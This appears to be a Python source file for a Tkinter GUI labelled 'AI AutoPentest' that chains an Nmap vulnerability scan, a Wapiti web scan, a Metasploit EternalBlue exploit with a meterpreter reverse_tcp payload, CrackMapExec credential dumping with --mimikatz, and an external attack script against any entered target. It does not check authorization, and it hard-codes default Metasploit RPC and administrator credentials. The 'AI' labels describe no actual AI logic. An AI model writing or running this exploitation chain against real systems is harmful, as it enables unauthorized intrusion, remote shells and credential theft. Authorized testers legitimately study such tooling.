### autopentest.py - Advanced Automated Penetration Testing ###


import tkinter as tk
from tkinter import scrolledtext, ttk
import threading
import json
import subprocess
import time
import re
import os
import nmap
from pymetasploit3.msfrpc import MsfRpcClient



def start_msfrpcd():
    """Check if Metasploit RPC (`msfrpcd`) is running and start it if necessary."""
    try:
        result = subprocess.run(["pgrep", "-f", "msfrpcd"], capture_output=True, text=True)
        
        if not result.stdout.strip():  # If no process is found
            print("[*] Starting Metasploit RPC...")
            subprocess.Popen(["msfrpcd", "-U", "msf", "-P", "msf", "-S", "-p", "55553", "-a", "127.0.0.1"],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(10)  # Allow msfrpcd to start
        else:
            print("[+] Metasploit RPC is already running.")
    except Exception as e:
        print(f"‚ùå Error starting Metasploit RPC: {e}")

class AIAutoPentest:
    def __init__(self, parent):
        """Initialize the AutoPentest frame inside the provided parent widget."""
        self.frame = tk.Frame(parent, bg="#2b2b2b")
        self.frame.pack(fill="both", expand=True)

        self.label = tk.Label(self.frame, text="üõ° AI AutoPentest", font=("Arial", 16, "bold"), bg="#2b2b2b", fg="#e0e0e0")
        self.label.pack(pady=10)
        
        
        # Label for Entry Field
        self.target_label = tk.Label(self.frame, text="Target IP or Domain:", bg="#2b2b2b", fg="#e0e0e0")
        self.target_label.pack(pady=5)

        # Entry Field with Placeholder
        self.target_entry = tk.Entry(self.frame, width=30, fg="gray")
        self.target_entry.pack(pady=5)
        self.target_entry.insert(0, "Enter target IP or domain")

        # Bind events to remove placeholder on focus and restore if empty
        self.target_entry.bind("<FocusIn>", self.clear_placeholder)
        self.target_entry.bind("<FocusOut>", self.restore_placeholder)


       # self.target_entry = tk.Entry(self.frame, text="Enter target IP or domain", font=("Arial", 12), width=40, bg="#3c3c3c", fg="#ffffff", insertbackground="white")
       # self.target_entry.pack(pady=5)
      #  self.target_entry.insert(0, "Enter target IP or domain")

        self.start_btn = tk.Button(
            self.frame, text="üöÄ Start Pentest", command=self.start_pentest_thread, bg="#ff4500", fg="white", font=("Arial", 12), relief="flat"
        )
        self.start_btn.pack(pady=10)

        self.result_box = scrolledtext.ScrolledText(self.frame, width=90, height=25, font=("Arial", 10), bg="#3c3c3c", fg="#e0e0e0", insertbackground="white")
        self.result_box.pack(padx=10, pady=10)

        # Progress Bar
        self.progress = ttk.Progressbar(self.frame, orient="horizontal", length=400, mode="determinate", style="TProgressbar")
        self.progress.pack(pady=10)

        # Status Label
        self.status_label = tk.Label(self.frame, text="Status: Idle", font=("Arial", 12), bg="#2b2b2b", fg="#e0e0e0")
        self.status_label.pack(pady=5)
        
        # Apply dark theme to progress bar
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TProgressbar", background="#ff4500", troughcolor="#3c3c3c", bordercolor="#3c3c3c", lightcolor="#ff6347", darkcolor="#ff4500")


    def clear_placeholder(self, event):
        if self.target_entry.get() == "Enter target IP or domain":
            self.target_entry.delete(0, tk.END)
            self.target_entry.config(fg="black")  # Change text color to black when typing

    def restore_placeholder(self, event):
        if not self.target_entry.get():
            self.target_entry.insert(0, "Enter target IP or domain")
            self.target_entry.config(fg="gray")  # Keep placeholder text gray


    def log(self, message):
        """Safely update the GUI log box from any thread."""
        def update_text():
            self.result_box.insert(tk.END, message + "\n")
            self.result_box.see(tk.END)  # Auto-scroll
        
        self.result_box.after(0, update_text)

    def update_status(self, status, progress_value, color="#ff4500"):
        """Update the status label and progress bar."""
        def update_ui():
            self.status_label.config(text=f"Status: {status}", fg=color)
            self.progress["value"] = progress_value
        self.status_label.after(0, update_ui)

    def start_pentest_thread(self):
        """Start pentesting in a new thread to keep the UI responsive."""
        target = self.target_entry.get().strip()
        if not target:
            self.log("‚ö†Ô∏è Please enter a valid target!")
            return
        
        self.log(f"üîç Starting AI AutoPentest on {target} ...\n")
        pentest_thread = threading.Thread(target=self.run_pentest, args=(target,), daemon=True)
        pentest_thread.start()

    def run_pentest(self, target):
        """Perform the pentest asynchronously to avoid GUI lag."""
        try:
            self.update_status("Running Network Scan...", 10)
            network_results = self.network_scan(target)

            self.update_status("Running Web Scan...", 30)
            web_results = self.web_scan(target)

            self.update_status("Exploiting Target...", 50)
            exploit_results = self.exploit_target(target, "windows/smb/ms17_010_eternalblue")

            self.update_status("Performing Lateral Movement...", 70)
            lateral_results = self.lateral_movement(target)

            self.update_status("Simulating AI Attacks...", 90)
            attack_simulation_results = self.ai_attack_simulation(target)

            scan_results = {
                "network_scan": network_results,
                "web_scan": web_results,
                "exploitation": exploit_results,
                "lateral_movement": lateral_results,
                "attack_simulation": attack_simulation_results,
            }
            
            self.generate_report(target, scan_results)

            self.update_status("Pentest Completed ‚úÖ", 100, color="lime")
            self.log("‚úÖ Pentest completed successfully! Report saved.")

        except Exception as e:
            self.log(f"‚ùå Error: {str(e)}")

    def network_scan(self, target):
        """Perform network scanning using Nmap."""
        nm = nmap.PortScanner()
        nm.scan(target, arguments="-A -T4 --script vuln")
        result = nm.csv()
        self.log("[+] Network Scan Completed.\n")
        return result

    def web_scan(self, target):
        """Perform AI-powered web scanning using Wapiti."""
        result = subprocess.run(["wapiti", "-u", target, "-f", "json", "-o", "autopentest.json"], capture_output=True, text=True)
        
        report_file = "autopentest.json"  # Directly specify the file
    
        #json_filename = f"{target}_*.json"  # Adjust to the actual filename format
       # report_file = next((f for f in os.listdir() if f.startswith(target) and f.endswith(".json")), None)

       # if report_file:
        if os.path.exists(report_file):
            with open(report_file, "r") as f:
                output = json.load(f)
                self.log("[+] Web Scan Completed.\n")
                return output
        else:
            self.log("‚ö†Ô∏è No JSON report found. Wapiti may have failed.")
            return {}
            
            
    

    def exploit_target(self, target, exploit_module):
        """AI-assisted exploitation using Metasploit."""
        try:
            start_msfrpcd()  # Ensure Metasploit RPC is running before connecting
            client = MsfRpcClient('msf', username='msf', ssl=False, port=55553, server='127.0.0.1')
            
     #       if not client or not client.consoles.list:
         #       self.log("‚ö†Ô∏è Metasploit RPC is not running. Start it first.")
         #       return "Metasploit not running"
         
              # Ensure the exploit exists
            if exploit_module not in client.modules.exploits:
                self.log(f"‚ö†Ô∏è Exploit module '{exploit_module}' not found in Metasploit.")
                return "Exploit module not found"
            
          #  exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
            exploit = client.modules.use('exploit', exploit_module)
            exploit['RHOSTS'] = target
          #  payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
          
            # Check available payloads
            available_payloads = exploit.payloads
            if "windows/x64/meterpreter/reverse_tcp" in available_payloads:
                payload = "windows/x64/meterpreter/reverse_tcp"
            elif "windows/meterpreter/reverse_tcp" in available_payloads:
                payload = "windows/meterpreter/reverse_tcp"
            elif "linux/x64/meterpreter/reverse_tcp" in available_payloads:
                payload = "linux/x64/meterpreter/reverse_tcp"
            else:
                self.log(f"‚ùå No compatible payload found for {exploit_module}")
                return "No compatible payload"
            exploit.execute(payload=payload)
            self.log("[+] Exploitation Attempted.\n")
            return "Exploit executed"
        except Exception as e:
            self.log(f"‚ùå Metasploit Error: {e}")
            return "Exploit failed"

    def lateral_movement(self, target):
        """Perform AI-powered lateral movement using CrackMapExec."""
        username = "administrator"  # Change to user input
        password = "password"       # Change to user input
        
        result = subprocess.run(
            ["crackmapexec", "smb", target, "-u", username, "-p", password, "--mimikatz"],
            capture_output=True, text=True
        )
        self.log("[+] Lateral Movement Completed.\n")
        return result.stdout

    def ai_attack_simulation(self, target):
        """AI-driven attack simulation using an external Python script."""
        result = subprocess.run(
            ["python3", "auto_attack.py", target],
            capture_output=True, text=True
        )
        self.log("[+] Attack Simulation Completed.\n")
        return result.stdout

    def sanitize_filename(self, target):
        """Remove invalid filename characters."""
        return re.sub(r'[^\w.-]', '_', target)
    
    def generate_report(self, target, scan_results):
        """Generate an AI-enhanced pentest report in JSON format inside autopentest_output folder."""
        output_folder = "autopentest_output"

        # Ensure the folder exists
        if not os.path.exists(output_folder):
            os.makedirs(output_folder)

        # Sanitize the target to be a valid filename
        safe_target = self.sanitize_filename(target)
    
        report_path = os.path.join(output_folder, f"{safe_target}_autopentest.json")  


        # Save the report
        with open(report_path, "w") as f:
            json.dump(scan_results, f, indent=4)

        self.log(f"üìÑ Report saved: {report_path}")

